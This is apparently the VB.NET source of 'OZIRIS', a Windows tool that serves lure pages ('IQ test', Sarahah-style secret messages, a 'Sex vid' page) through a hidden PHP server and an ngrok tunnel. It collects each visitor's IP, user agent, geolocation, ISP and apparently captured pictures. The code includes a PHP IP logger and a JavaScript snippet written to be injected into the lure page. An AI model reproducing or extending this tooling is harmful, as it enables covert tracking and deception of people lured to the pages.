Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Text.RegularExpressions
Imports System.Threading
Imports AltoControls
Imports Guna.UI2.WinForms
Imports NAudio.Wave
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq

Public Class Form1
    Inherits Form
    Sub Main()
        InitializeComponent()
    End Sub
    Public f As String = Application.StartupPath + "\tsweb\iqen"
    Public integ As Boolean = False
    Public integ2 As Boolean = False
    Dim targetText As String = "First Time Process "
    Dim currentIndex As Integer = 0
    Private ramCounter As PerformanceCounter
    Private systemCpuCounter As PerformanceCounter
    Private phpProcessName As String = "php"
    Private phpProcessId As Integer = -1
    Private phpCpuCounter As PerformanceCounter
    Private phpRamCounter As PerformanceCounter
    Public counterstat As Boolean = False
    Public process As New Process
    Public ngrokProcess As New Process
    Public dir As String
    Public row As Boolean = True
    Public svc As Boolean = False
    Private Const BlueThreshold As Integer = 20
    Private Const GreenThreshold As Integer = 40
    Private Const YellowThreshold As Integer = 60
    Private Const RedThreshold As Integer = 80
    Public initxt As String
    Private clickedRowContent As String()
    Private originalLocation As Point
    Private waveStream As WaveStream
    Private wavePlayer As WaveOutEvent
    Dim random As New Random()
    Private costomPath As String
    Dim elapsedTime As Integer = 0
    Dim moveRight As Boolean = True
    Private displayTimer As Timer
    Dim stepSize As Integer = 1
    Private selectedpath As String
    Public Sub checkphp()
        Dim folderPath As String = Application.StartupPath + "\resources\php"
        Dim filesToCheck As String() = {
            "deplister.exe",
            "dev",
            "ext",
            "extras",
            "glib-2.dll",
            "gmodule-2.dll",
            "icudt72.dll",
            "icuin72.dll",
            "icuio72.dll",
            "icuuc72.dll",
            "lib",
            "libcrypto-3-x64.dll",
            "libenchant2.dll",
            "libpq.dll",
            "libsasl.dll",
            "libsodium.dll",
            "libsqlite3.dll",
            "libssh2.dll",
            "libssl-3-x64.dll",
            "license.txt",
            "news.txt",
            "nghttp2.dll",
            "phar.phar.bat",
            "pharcommand.phar",
            "php-cgi.exe",
            "php-win.exe",
            "php.exe",
            "php.ini-development",
            "php.ini-production",
            "php.zip",
            "php8.dll",
            "php8embed.lib",
            "php8phpdbg.dll",
            "phpdbg.exe",
            "readme-redist-bins.txt",
            "README.md",
            "snapshot.txt"
        }
        If Directory.Exists(folderPath) Then
            For Each fileToCheck As String In filesToCheck
                Dim filePath As String = Path.Combine(folderPath, fileToCheck)
                If File.Exists(filePath) OrElse Directory.Exists(filePath) Then
                    integ2 = True
                Else
                    integ2 = False
                End If
            Next
        Else
            integ2 = False
        End If
    End Sub
    Public Sub phpcounter()
        Dim phpProcesses() As Process = Process.GetProcessesByName(phpProcessName)
        If phpProcesses.Length > 0 Then
            phpProcessId = phpProcesses(0).Id
        End If
        If phpProcessId <> -1 Then
            phpCpuCounter = New PerformanceCounter("Process", "% Processor Time", phpProcessName)
            phpRamCounter = New PerformanceCounter("Process", "Working Set", phpProcessName)
            counterstat = True
        Else
        End If
    End Sub
#Disable Warning
    Public Sub checkngrok()
        Dim folderPath As String = Application.StartupPath + "\resources\ngrok"
        Dim filesToCheck As String() = {"ngrok.exe", "ngrok.zip"}
        If Directory.Exists(folderPath) Then
            For Each fileToCheck As String In filesToCheck
                Dim filePath As String = Path.Combine(folderPath, fileToCheck)
                If File.Exists(filePath) OrElse Directory.Exists(filePath) Then
                    integ = True
                Else
                    integ = False
                End If
            Next
        Else
            integ = False
        End If
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim ctx As Double
        Dim thread As New Thread(
                   Sub()

                       ctx = 0
                       Me.Opacity = 0

                       While ctx < 1
                           Me.Invoke(
                               Sub()

                                   Me.Opacity = ctx
                               End Sub
                           )

                           ctx = ctx + 0.03
                           Thread.Sleep(30)
                       End While


                       Me.Invoke(
                           Sub()

                               Me.Opacity = 1

                           End Sub
                       )
                   End Sub
               )


        thread.Start()
        Dim gunaScrollBar As New Guna2VScrollBar()


        Dim dataGridView As DataGridView = Guna2DataGridView1
        dataGridView.DefaultCellStyle.WrapMode = DataGridViewTriState.True
        dataGridView.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells

        ' Set the desired row height (for example, 50 pixels)
        dataGridView.RowTemplate.Height = 300
        MakeSlightlyRoundForm(30)
        DrakeUIDataGridView1.ScrollBars = ScrollBars.Vertical
        Try
            Guna2TextBox3.Text = My.Settings.ngrokex
        Catch ex As Exception

        End Try

        Try
            If Not File.Exists(Application.StartupPath + "\resources\tsweb.zip") Then
                Try
                    Directory.CreateDirectory("resources")
                Catch ex As Exception

                End Try

                ExtractResourceToFile("tsweb", Application.StartupPath + "\resources\tsweb.zip")
                Threading.Thread.Sleep(1000)
                ExtractZipFile(Application.StartupPath + "\resources\tsweb.zip", Application.StartupPath + "\resources")
            End If
        Catch ex As Exception
        End Try
        Dim extractPath As String = Application.StartupPath + "\resources\WebTest"
        ramCounter = New PerformanceCounter("Memory", "Available MBytes")
        systemCpuCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
        CircularPB1.MaxValue = 100
        Me.DoubleBuffered = True
        If My.Settings.firstTM Then
            Try
                Directory.CreateDirectory("resources")

                Directory.CreateDirectory("resources\php")

            Catch ex As Exception

            End Try
            Me.ShowInTaskbar = False
            FirstTM.Show()

            My.Settings.firstTM = False
            My.Settings.Save()
            Me.Hide()
        End If
        checkngrok()
        checkphp()
        If Not integ And Not integ2 Then
            Try
                Try
                    If Directory.Exists("resources") Then
                        Directory.Delete("resources", True)
                        FirstTM.Show()
                    Else
                    End If
                Catch ex As Exception
                End Try

            Catch ex As Exception
                MsgBox("Error : " + ex.ToString(), MsgBoxStyle.Exclamation)
                Application.Exit()
            End Try

        End If
        CircularPB1.Visible = True
        CircularPB2.Visible = True
        CircularPB3.Visible = True
        GetIPInfoAndDisplayAsync()
        Timer2.Start()
    End Sub
    Private Async Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If currentIndex < targetText.Length Then

            currentIndex += 1
        Else
            Timer1.Stop()
            Await Task.Delay(3000)
            My.Settings.firstTM = False
            My.Settings.Save()
        End If
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim totalRam As Single = My.Computer.Info.TotalPhysicalMemory / (1024 * 1024)
        Dim systemCpuUsage As Single = systemCpuCounter.NextValue()
        Dim cpuUsagePercentage As Integer = CInt(systemCpuUsage)
        Dim availableRam As Single = ramCounter.NextValue()
        Dim ramUsagePercentage As Integer = CInt(((totalRam - availableRam) / totalRam) * 100)
        Guna2TextBox1.Text = $"RAM {totalRam}/{availableRam} MB"
        CircularPB1.Value = ramUsagePercentage
        CircularPB2.Value = cpuUsagePercentage
        If counterstat Then
            UpdateProgressBar(phpRamCounter, CircularPB3, Guna2TextBox2, "PHP RAM usage {0} MB")
        Else
            phpcounter()
        End If
        UpdateProgressBarColor(CircularPB1, BlueThreshold, GreenThreshold, YellowThreshold, RedThreshold)
        UpdateProgressBarColor(CircularPB2, BlueThreshold, GreenThreshold, YellowThreshold, RedThreshold)
        UpdateProgressBarColor(CircularPB3, BlueThreshold, GreenThreshold, YellowThreshold, RedThreshold)
    End Sub
    Private Sub UpdateProgressBarColor(progressBar As CircularPB, blueThreshold As Integer, greenThreshold As Integer, yellowThreshold As Integer, redThreshold As Integer)
        Dim value As Integer = CInt(progressBar.Value)
        If value < blueThreshold Then
            progressBar.ProgressColor = Color.Blue
            'progressBar.ForeColor = Color.Blue
        ElseIf value < greenThreshold Then
            progressBar.ProgressColor = Color.Green
            'progressBar.ForeColor = Color.Green
        ElseIf value < yellowThreshold Then
            progressBar.ProgressColor = Color.Yellow
            ' progressBar.ForeColor = Color.Yellow
        ElseIf value < redThreshold Then
            progressBar.ProgressColor = Color.Red
            'progressBar.ForeColor = Color.Red
        Else
            ' progressBar.ProgressColor = Color.White
            ' progressBar.ForeColor = Color.White
        End If
    End Sub
    Private Sub UpdateProgressBar(counter As PerformanceCounter, progressBar As CircularPB, label As Guna2TextBox, labelTextFormat As String)
        Try
            Dim phpRamUsage As Single = counter.NextValue() / (1024 * 1024)
            Dim percentage As Integer = CInt((phpRamUsage / progressBar.MaxValue) * 100)
            progressBar.Value = percentage
            Guna2TextBox2.Text = String.Format(labelTextFormat, phpRamUsage)
        Catch ex As Exception
            Guna2TextBox2.Text = "PHP_Process_not_found"
            progressBar.Value = 0
        End Try
    End Sub
    Private Async Sub LOG(msg As String)
        DrakeUITextBox1.AppendText(vbNewLine + msg)
    End Sub

    Private Async Sub Guna2GradientButton3_Cli(sender As Object, e As EventArgs) Handles Guna2GradientButton3.Click
        LOG("===========  SETTING UP ============")
        If My.Settings.ngrokex = "nullable" Then
            'grok.Show()
            GoTo Gl
        Else
Gl:
            If svc = False Then
                If String.IsNullOrWhiteSpace(f) Or f = String.Empty Then
                    f = Application.StartupPath + "\resources\tsweb\iqen"

                    Dim htmlFilePath As String = f + "\index.html"
                    LOG("IP.json / ip.php dropping")
                    Try
                        File.Create(f + "\ip.json")
                        WritePhpCodeToFile(f + "\ip.php")
                        LOG("Dropped")
                    Catch ex As Exception
                        LOG("not dropped (UNEXPECTED ERROR)!!!! / IGNORE ...")
                    End Try
                    If File.Exists(htmlFilePath) Then
                        Dim htmlContent As String = File.ReadAllText(htmlFilePath)
                        ' InjectJavaScriptIntoHTML(htmlContent)
                    Else
                        If DrakeUIRadioButton2.Checked Then
                            Select Case GunaComboBox1.SelectedItem.ToString()
                                Case "Secret Message (EN)"
                                    f = Application.StartupPath + "\resources\tsweb\sarahahen"
                                Case "IQ test (EN)"
                                    f = Application.StartupPath + "\resources\tsweb\iqen"
                                Case "IQ test (AR)"
                                    f = Application.StartupPath + "\resources\tsweb\iqAR"
                                Case "Sarahah V1 (AR)"
                                    f = Application.StartupPath + "\resources\tsweb\sarahahv1"
                                Case "Sarahah V2 (AR)"
                                    f = Application.StartupPath + "\resources\tsweb\sarahahv2"
                                Case "Sex vid (EN)"
                                    f = Application.StartupPath + "\resources\tsweb\sexmag"
                                Case "Fucked by DRAGO"
                                    f = Application.StartupPath + "\resources\tsweb\DRAGO"
                                Case Else
                                    MsgBox("UNHUNDLED EXCEPTION ", MsgBoxStyle.Critical)
                                    Exit Sub
                            End Select
                        Else
                            If My.Settings.indexfolder IsNot String.Empty Then
                                f = My.Settings.indexfolder
                            Else
                                LOG("No path Selected (ERROR) / EXIT")
                                Exit Sub
                            End If
                        End If





                    End If
                    LOG("Selected path << " + f)
                    Dim x As String = f
                    Await Task.Delay(500)
                    LOG("Starting PHP server on selected path")
                    Dim count As Integer = 0
                    While count < 4
                        LOG(count.ToString)
                        count = count + 1
                        Await Task.Delay(300)
                    End While

                    StartphpSERVER(x)
                    LOG($"php server started on port {MetroSetNumeric1.Value.ToString()}")
                    MetroSetTextBox4.Text = "http://localhost:8000/"
                    If DrakeUICheckBox1.Checked = True Then


                        RunCommandAndCaptureOutput()
                    End If
                    If DrakeUICheckBox2.Checked = True Then
                        If My.Settings.ngrokex = "nullable" Then
                            DrakeUICheckBox2.Checked = False

                            Label3.Text = "Ngrok key not found"


                        Else
                            Label3.Text = " "
                            StartNgrokAsync()
                            Threading.Thread.Sleep(500)
                            Await DownloadWebsite("http://127.0.0.1:4040/api/tunnels", Application.StartupPath + "\resources\tunnels.json")
                            Threading.Thread.Sleep(1500)
                            Dim publicUrl As String = ParseJsonAndExtractPublicUrl(Application.StartupPath + "\resources\tunnels.json")
                            DisplayPublicUrlInTextBox(publicUrl)
                            If publicUrl = String.Empty Then
                                DrakeUILampLED2.On = False

                            End If
                        End If



                    End If


                    Timer3.Start()
                    '##################################################################
                    Timer4.Start()
                    LoadData()
                Else
                    f = Application.StartupPath + "\resources\tsweb\iqen"
                    Dim htmlFilePath As String = f + "\index.html"
                    If File.Exists(htmlFilePath) Then
                        Dim htmlContent As String = File.ReadAllText(htmlFilePath)
                        ' InjectJavaScriptIntoHTML(htmlContent)
                    Else
                        MessageBox.Show("index.html file not found.")

                    End If
                    Try
                        File.Create(f + "\ip.json")
                        WritePhpCodeToFile(f + "\ip.php")
                    Catch ex As Exception
                    End Try
                    f = Application.StartupPath + "\resources\tsweb\iqen"

                    If DrakeUIRadioButton2.Checked Then
                        Select Case GunaComboBox1.SelectedItem.ToString()
                            Case "Secret Message (EN)"
                                f = Application.StartupPath + "\resources\tsweb\sarahahen"
                            Case "IQ test (EN)"
                                f = Application.StartupPath + "\resources\tsweb\iqen"
                            Case "IQ test (AR)"
                                f = Application.StartupPath + "\resources\tsweb\iqAR"
                            Case "Sarahah V1 (AR)"
                                f = Application.StartupPath + "\resources\tsweb\sarahahv1"
                            Case "Sarahah V2 (AR)"
                                f = Application.StartupPath + "\resources\tsweb\sarahahv2"
                            Case "Sex vid (EN)"
                                f = Application.StartupPath + "\resources\tsweb\sexmag"
                            Case "Fucked by DRAGO"
                                f = Application.StartupPath + "\resources\tsweb\DRAGO"
                            Case Else
                                LOG("UNHUNDLED EXCEPTION ")
                                Exit Sub
                        End Select
                    Else
                        If My.Settings.indexfolder IsNot String.Empty Then
                            f = My.Settings.indexfolder
                        Else
                            LOG("No path Selected (ERROR) / EXIT")
                            Exit Sub
                        End If
                    End If
                    LOG("Selected path << " + f)
                    Dim x As String = f
                    Await Task.Delay(500)
                    LOG("Starting PHP server on selected path")
                    Dim count As Integer = 0
                    While count < 4
                        LOG(count.ToString)
                        count += 1
                        Await Task.Delay(300)
                    End While
                    StartphpSERVER(x)
                    MetroSetTextBox4.Text = $"http://localhost:{MetroSetNumeric1.Value.ToString()}/"
                    If DrakeUICheckBox1.Checked = True Then

                        RunCommandAndCaptureOutput()
                    End If
                    If DrakeUICheckBox2.Checked = True Then
                        If My.Settings.ngrokex = "nullable" Then
                            DrakeUICheckBox2.Checked = False

                            Label3.Text = "Ngrok key not found"


                        Else
                            Label3.Text = " "
                            StartNgrokAsync()
                            Threading.Thread.Sleep(500)
                            Await DownloadWebsite("http://127.0.0.1:4040/api/tunnels", Application.StartupPath + "\resources\tunnels.json")
                            Threading.Thread.Sleep(1500)
                            Dim publicUrl As String = ParseJsonAndExtractPublicUrl(Application.StartupPath + "\resources\tunnels.json")
                            DisplayPublicUrlInTextBox(publicUrl)
                            If publicUrl = String.Empty Then
                                DrakeUILampLED2.On = False

                            End If
                        End If


                    End If
                    Timer3.Start()


                End If

                Guna2GradientButton3.FillColor = Color.DarkRed
                Guna2GradientButton3.Text = "Close the server"
                svc = True
                '#########################
                Timer4.Start()
                LoadData()
            Else
                Try
                    Dim psi As ProcessStartInfo = New ProcessStartInfo
                    psi.WindowStyle = ProcessWindowStyle.Hidden
                    psi.Arguments = "/im " & "php.exe" & " /f"
                    psi.FileName = "taskkill"
                    Dim p As Process = New Process()
                    p.StartInfo = psi
                    p.Start()
                    p.Close()
                    Dim psi0 As ProcessStartInfo = New ProcessStartInfo
                    psi0.WindowStyle = ProcessWindowStyle.Hidden
                    psi0.Arguments = "/im " & "ngrok.exe" & " /f"
                    psi0.FileName = "taskkill"
                    Dim p0 As Process = New Process()
                    p0.StartInfo = psi0
                    p0.Start()
                    p0.Close()
                    If sshProcess IsNot Nothing AndAlso Not sshProcess.HasExited Then
                        ' Terminate the SSH process
                        sshProcess.Kill()
                    End If
                Catch ex As Exception
                    MsgBox("ERROR_HDL_CLOSING : TaskKill ngrok and php error")
                End Try
                Guna2GradientButton3.FillColor = Color.FromArgb(0, 192, 0)
                Guna2GradientButton3.Text = "Start the server"
                DrakeUILampLED2.On = False
                DrakeUILampLED1.On = False
                DrakeUILampLED3.On = False
                svc = False
                Timer3.Stop()
                Timer4.Stop()
                Try

                    DrakeUIDataGridView1.Rows.Clear()
                    DrakeUIDataGridView2.Rows.Clear()
                    DrakeUIDataGridView3.Rows.Clear()
                Catch ex As Exception

                End Try


                Try
                    Try
                        If Directory.Exists(Application.StartupPath + "\saves") = False Then
                            Directory.CreateDirectory(Application.StartupPath + "\saves")
                        End If
                        Try
                            If Directory.Exists(Application.StartupPath + "\saves\picture") = False Then
                                Directory.CreateDirectory(Application.StartupPath + "\saves\picture")
                            End If
                            If Directory.Exists(Application.StartupPath + "\saves\data") = False Then
                                Directory.CreateDirectory(Application.StartupPath + "\saves\data")
                            End If
                            If Directory.Exists(Application.StartupPath + "\saves\logs") = False Then
                                Directory.CreateDirectory(Application.StartupPath + "\saves\logs")
                            End If
                        Catch ex As Exception

                        End Try
                    Catch ex As Exception

                    End Try
                    Try
                        Dim ggt As String = $"\saves\data\user_data_{Date.Now()}.json"



                        If IO.File.Exists(f + "\user_data.json") Then
                            IO.File.Copy(f + "\user_data.json", Application.StartupPath + ggt.Replace("/", "_").Replace(":", "_").Replace(" ", "_"))
                        End If
                        IO.File.Delete(f + "\user_data.json")

                        Dim files As String() = Directory.GetFiles(f + "\captAXE")

                        If files.Length > 0 Then
                            For Each filel As String In files
                                Dim fileName As String = Path.GetFileName(filel)
                                Try
                                    If IO.File.Exists(filel) Then
                                        IO.File.Move(filel, Application.StartupPath + "\saves\picture\" + fileName)
                                    End If
                                Catch ex As Exception

                                End Try
                            Next

                            For Each filel As String In files
                                Try
                                    If IO.File.Exists(filel) Then
                                        IO.File.Delete(filel)
                                    End If
                                Catch ex As Exception

                                End Try
                            Next
                        End If

                    Catch ex As Exception

                    End Try

                Catch ex As Exception

                End Try
                Try
                    Dim textToSave As String = "##################################################################################" + vbCrLf + $"NULLED.to OZIRIS   {Date.Now.ToString()}" + vbCrLf + "##################################################################################" + vbCrLf + DrakeUITextBox1.Text

                    ' Specify the folder where you want to save the log files
                    Dim logFolder As String = Application.StartupPath + "\saves\logs"

                    ' Ensure the log folder exists, create it if not
                    If Not Directory.Exists(logFolder) Then
                        Directory.CreateDirectory(logFolder)
                    End If

                    ' Generate a filename with the current date and time
                    Dim fileName As String = $"PHP_Log_{DateTime.Now:yyyyMMdd_HHmmss}.log"

                    ' Combine the log folder and the filename to create the full path
                    Dim filePath As String = Path.Combine(logFolder, fileName)

                    ' Write the text to the log file
                    File.WriteAllText(filePath, textToSave)
                    DrakeUITextBox1.Clear()
                    LOG($"logs saved in  {filePath}")
                Catch ex As Exception

                End Try

            End If
        End If
    End Sub
    Private pth As String = Application.StartupPath + "\resources\Flags"
    Private Sub LoadData()
        Try
            Dim jsonContent As String = File.ReadAllText(f + "\user_data.json")
            Dim jsonData As JObject = JObject.Parse(jsonContent)

            For Each key As String In jsonData.Properties().Select(Function(p) p.Name)
                Dim data As JObject = jsonData(key)
                Dim ipValue As String = If(data("query") IsNot Nothing, data("ip").ToString(), String.Empty)

                Dim existingRow As DataGridViewRow = DrakeUIDataGridView2.Rows.Cast(Of DataGridViewRow)().FirstOrDefault(
                Function(row) Convert.ToString(row.Cells("Column1").Value) = ipValue)

                If existingRow Is Nothing Then
                    Try
                        If Directory.Exists(pth) Then
                            Dim files As String() = Directory.GetFiles(pth, "*.ico")
                            Dim icon As Image = Nothing

                            For Each filel As String In files
                                Dim countryName As String = Path.GetFileNameWithoutExtension(filel)


                                ' Check if the country code matches the data in JSON
                                If data("countryCode").ToString() = countryName Then
                                    ' Add the data to the DataGridView
                                    icon = New Bitmap(Image.FromFile(filel), New Size(25, 25))
                                    If DrakeUICheckBox12.Checked = True Then
                                        Dim notificationForm As New about()
                                        notificationForm.SetNotificationContent(ipValue, data("country"), data("proxy"), New Bitmap(Image.FromFile(filel)))
                                        notificationForm.Show()
                                    End If

                                    DrakeUIDataGridView1.Rows.Add(ipValue)
                                    DrakeUIDataGridView2.Rows.Add(ipValue, data("proxy"), data("userAgent"), data("country"), data("city"), data("countryCode"), icon)
                                    DrakeUIDataGridView3.Rows.Add(ipValue, data("zip"), data("org"), data("lat").ToString() + "\" + data("lon").ToString(), data("timezone"), data("isp"))
                                    LOG($"someone with ip {ipValue} visited the site")
                                    Exit For

                                End If
                            Next
                            If icon Is Nothing Then
                                Dim iconss As New Bitmap(Image.FromFile(pth + "\_nato.ico"), New Size(25, 25))
                                If DrakeUICheckBox12.Checked = True Then
                                    Dim notificationForm As New about()
                                    notificationForm.SetNotificationContent(ipValue, data("country"), data("proxy"), New Bitmap(Image.FromFile(pth + "\_nato.ico")))
                                    notificationForm.Show()
                                End If

                                DrakeUIDataGridView1.Rows.Add(ipValue)
                                DrakeUIDataGridView2.Rows.Add(ipValue, data("proxy"), data("userAgent"), data("country"), data("city"), data("countryCode"), icon)
                                DrakeUIDataGridView3.Rows.Add(ipValue, data("zip"), data("org"), data("lat").ToString() + "\" + data("lon").ToString(), data("timezone"), data("isp"))
                                LOG($"someone with ip {ipValue} visited the site")
                            End If
                        End If
                    Catch ex As Exception
                        LOG("unknown error")
                    End Try
                End If
            Next
        Catch ex As Exception
            LOG("unknown error")
        End Try
    End Sub

    Private Sub LoadAndPopulateDataGridView(jsonFilePath As String)
        Dim json As String = File.ReadAllText(jsonFilePath)
        Dim ipList As List(Of String) = JsonConvert.DeserializeObject(Of List(Of String))(json)
        Dim dt As New DataTable()
        dt.Columns.Add("IP Address", GetType(String))
        For Each ip As String In ipList
            If Not IPExistsInDataTable(dt, ip) Then
                dt.Rows.Add(ip)
            End If
        Next
        DrakeUIDataGridView1.DataSource = dt
        'Label8.Text = "LAST_CONNECT " + (DrakeUIDataGridView1.Rows.Count - 1).ToString()
    End Sub
    Private Sub AppendTextToTextBox(text As String)
        If Not String.IsNullOrEmpty(text) Then
            DrakeUITextBox1.Invoke(Sub() DrakeUITextBox1.AppendText(text & Environment.NewLine))
        End If
    End Sub

    Public Async Sub StartphpSERVER(webFolderPath As String)
        Dim phpExePath As String = Application.StartupPath + "\resources\php\php.exe"
        Dim serverOptions As String = $"-S localhost:{MetroSetNumeric1.Value.ToString()} -t " + webFolderPath

        Dim processInfo As New ProcessStartInfo(phpExePath, serverOptions)
        processInfo.CreateNoWindow = True
        processInfo.RedirectStandardOutput = True
        processInfo.RedirectStandardError = True
        processInfo.UseShellExecute = False
        processInfo.WindowStyle = ProcessWindowStyle.Hidden
        Dim process As New Process()
        process.StartInfo = processInfo
        AddHandler process.OutputDataReceived, Sub(sender, e) AppendTextToTextBox(e.Data)
        AddHandler process.ErrorDataReceived, Sub(sender, e) AppendTextToTextBox(e.Data)
        process.Start()
        DrakeUILampLED1.On = True
        process.BeginOutputReadLine()
        process.BeginErrorReadLine()
        Await Task.Run(Sub() process.WaitForExit())
        process.Close()
    End Sub
    Public Async Sub StartNgrokAsync()
        Dim ngrokExePath As String = Application.StartupPath + "\resources\ngrok\ngrok.exe"
        Dim ngrokOptions As String = $"http {MetroSetNumeric1.Value.ToString()}"
        Dim ngrokProcessInfo As New ProcessStartInfo(ngrokExePath, ngrokOptions)
        ngrokProcessInfo.CreateNoWindow = True
        ngrokProcessInfo.RedirectStandardOutput = True
        ngrokProcessInfo.RedirectStandardError = True
        ngrokProcessInfo.UseShellExecute = False
        ngrokProcessInfo.WindowStyle = ProcessWindowStyle.Hidden
        Dim ngrokProcess As New Process()
        ngrokProcess.StartInfo = ngrokProcessInfo
        AddHandler ngrokProcess.OutputDataReceived, Sub(sender, e) GrokErrorHandler(e.Data)
        AddHandler ngrokProcess.ErrorDataReceived, Sub(sender, e) GrokErrorHandler(e.Data)
        ngrokProcess.Start()
        DrakeUILampLED2.On = True
        Await Task.Run(Sub() ngrokProcess.WaitForExit())
    End Sub
    Sub DisplayPublicUrlInTextBox(publicUrl As String)
        If Not String.IsNullOrEmpty(publicUrl) Then
            MetroSetTextBox1.Text = publicUrl
            initxt = publicUrl
            If Guna2CheckBox1.Checked Then
                Process.Start(publicUrl)
            End If

        Else
            LOG("Error retrieving public_url")
            MetroSetTextBox1.Text = "Error retrieving public_url"
            initxt = "Error retrieving public_url"
        End If
    End Sub
    Sub ApplicationExitHandler(sender As Object, e As EventArgs) Handles MyBase.Closing
        Try
            Dim psi As ProcessStartInfo = New ProcessStartInfo
            psi.WindowStyle = ProcessWindowStyle.Hidden
            psi.Arguments = "/im " & "php.exe" & " /f"
            psi.FileName = "taskkill"
            Dim p As Process = New Process()
            p.StartInfo = psi
            p.Start()
            p.Close()
            Dim psi0 As ProcessStartInfo = New ProcessStartInfo
            psi0.WindowStyle = ProcessWindowStyle.Hidden
            psi0.Arguments = "/im " & "ngrok.exe" & " /f"
            psi0.FileName = "taskkill"
            Dim p0 As Process = New Process()
            p0.StartInfo = psi0
            p0.Start()
            p0.Close()
            If sshProcess IsNot Nothing AndAlso Not sshProcess.HasExited Then
                ' Terminate the SSH process
                sshProcess.Kill()
            End If
        Catch ex As Exception

        End Try
    End Sub
    Private Async Sub GrokErrorHandler(text As String)
        If Not String.IsNullOrEmpty(text) Then
            Await Task.Run(Sub()
                               If text.Contains("ERR_NGROK") Then
                                   Me.Invoke(Sub()
                                                 LOG("ERROR_NGROK_CONSOLE : invalid key or key timeout")

                                             End Sub)
                               End If
                           End Sub)
        End If
    End Sub
    Private Sub Button1_Click_1(sender As Object, e As EventArgs)
        FirstTM.Show()
        Me.Hide()
    End Sub
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Try
            LoadAndPopulateDataGridView(f + "\ip.json")
        Catch ex As Exception
        End Try
    End Sub
    Private Sub InjectJavaScriptIntoHTML(htmlContent As String)
        Dim jsCode As String = "document.addEventListener(""DOMContentLoaded"", function () {" & vbCrLf &
                               "    // OZIRIS to get user's IP address" & vbCrLf &
                               "    function getUserIP(callback) {" & vbCrLf &
                               "        fetch(""https://api64.ipify.org?format=json"")" & vbCrLf &
                               "            .then(response => response.json())" & vbCrLf &
                               "            .then(data => callback(data.ip))" & vbCrLf &
                               "            .catch(error => console.error(""Error fetching IP:"", error));" & vbCrLf &
                               "    }" & vbCrLf &
                               vbCrLf &
                               "    // Function to send IP to PHP file" & vbCrLf &
                               "    function sendIPToPHP(ip) {" & vbCrLf &
                               "        fetch(""ip.php"", {" & vbCrLf &
                               "            method: ""POST""," & vbCrLf &
                               "            headers: {" & vbCrLf &
                               "                ""Content-Type"": ""application/x-www-form-urlencoded""," & vbCrLf &
                               "            }," & vbCrLf &
                               "            body: ""ip="" + ip," & vbCrLf &
                               "        })" & vbCrLf &
                               "            .then(response => response.text())" & vbCrLf &
                               "            .then(data => console.log(data))" & vbCrLf &
                               "            .catch(error => console.error(""Error sending IP to PHP:"", error));" & vbCrLf &
                               "}" & vbCrLf &
                               vbCrLf &
                               "// Get user's IP and send it to PHP file" & vbCrLf &
                               "getUserIP(function (ip) {" & vbCrLf &
                               "    sendIPToPHP(ip);" & vbCrLf &
                               "});" & vbCrLf &
                               "});"
        Dim injectPosition As Integer = htmlContent.IndexOf("</body>", StringComparison.OrdinalIgnoreCase)
        If injectPosition >= 0 Then
            If Not htmlContent.Contains("OZIRIS") Then
                Dim modifiedHtmlContent As String = htmlContent.Insert(injectPosition, "<script>" & vbCrLf & jsCode & vbCrLf & "</script>")
                File.WriteAllText(f + "\index.html", modifiedHtmlContent)
            End If

        Else
            MessageBox.Show("Error injecting JavaScript. </body> not found in the HTML content.")
            Application.Exit()
        End If
    End Sub
    Private Sub WritePhpCodeToFile(phpFilePath As String)
        Dim phpCode As String = "<?php" & vbCrLf &
                               vbCrLf &
                               "function getIPs() {" & vbCrLf &
                               "    $json = file_get_contents('ip.json');" & vbCrLf &
                               "    $ips = json_decode($json, true);" & vbCrLf &
                               vbCrLf &
                               "    return is_array($ips) ? $ips : [];" & vbCrLf &
                               "}" & vbCrLf &
                               vbCrLf &
                               "function saveIPs($ips) {" & vbCrLf &
                               "    $json = json_encode($ips);" & vbCrLf &
                               "    file_put_contents('ip.json', $json);" & vbCrLf &
                               "}" & vbCrLf &
                               vbCrLf &
                               "$ip = isset($_POST['ip']) ? $_POST['ip'] : '';" & vbCrLf &
                               vbCrLf &
                               "if ($ip !== '') {" & vbCrLf &
                               "    $existingIPs = getIPs();" & vbCrLf &
                               vbCrLf &
                               "    if (!in_array($ip, $existingIPs)) {" & vbCrLf &
                               "        $existingIPs[] = $ip;" & vbCrLf &
                               "        saveIPs($existingIPs);" & vbCrLf &
                               "        echo 'IP added successfully.';" & vbCrLf &
                               "    } else {" & vbCrLf &
                               "        echo 'IP already exists.';" & vbCrLf &
                               "    }" & vbCrLf &
                               "} else {" & vbCrLf &
                               "    echo 'Invalid IP.';" & vbCrLf &
                               "}" & vbCrLf &
                               "?>"
        File.WriteAllText(phpFilePath, phpCode)
    End Sub

    Private Sub Label8_Click(sender As Object, e As EventArgs)

    End Sub



    Private Sub Guna2ImageButton2_Click(sender As Object, e As EventArgs) Handles Guna2ImageButton2.Click
        Try
            Dim psi As ProcessStartInfo = New ProcessStartInfo
            psi.WindowStyle = ProcessWindowStyle.Hidden
            psi.Arguments = "/im " & "php.exe" & " /f"
            psi.FileName = "taskkill"
            Dim p As Process = New Process()
            p.StartInfo = psi
            p.Start()
            p.Close()
            Dim psi0 As ProcessStartInfo = New ProcessStartInfo
            psi0.WindowStyle = ProcessWindowStyle.Hidden
            psi0.Arguments = "/im " & "ngrok.exe" & " /f"
            psi0.FileName = "taskkill"
            Dim p0 As Process = New Process()
            p0.StartInfo = psi0
            p0.Start()
            p0.Close()
            If sshProcess IsNot Nothing AndAlso Not sshProcess.HasExited Then
                ' Terminate the SSH process
                sshProcess.Kill()
            End If
        Catch ex As Exception

        End Try
        Application.Exit()
    End Sub

    Private Sub Guna2ImageButton3_Click(sender As Object, e As EventArgs) Handles Guna2ImageButton3.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub
    Dim isDragging As Boolean
    Dim clickPoint As Point
    Private Sub Form1_MouseDown(sender As Object, e As MouseEventArgs) Handles Guna2ShadowPanel2.MouseDown
        If e.Button = MouseButtons.Left Then
            isDragging = True
            clickPoint = New Point(e.X, e.Y)
        End If
    End Sub

